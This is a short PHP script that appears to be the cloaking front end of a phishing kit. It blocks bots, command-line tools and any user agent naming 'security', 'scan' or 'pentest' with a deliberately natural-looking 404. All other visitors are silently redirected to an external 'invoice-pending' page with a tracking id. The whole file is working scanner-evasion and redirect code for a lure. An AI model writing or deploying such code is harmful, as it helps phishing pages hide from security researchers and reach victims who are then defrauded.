<?php
// Anti-bot check
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';

// Block common bot signatures
$bots = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java/', 'node-fetch', 'axios', 'go-http', 'perl', 'ruby', 'scan', 'security', 'pentest'];

foreach ($bots as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        http_response_code(404); // 404 looks more natural than blank 200
        exit;
    }
}

// Block empty or suspicious user agents
if (empty($user_agent) || strlen($user_agent) < 10) {
    http_response_code(404);
    exit;
}

// Real user — redirect silently
header("Location: https://sunistcsgroup.com/e/invoice-pending?tid=kYxspSnL1VcUpGcKoGcUew&prt=1", true, 302);
exit;
?>
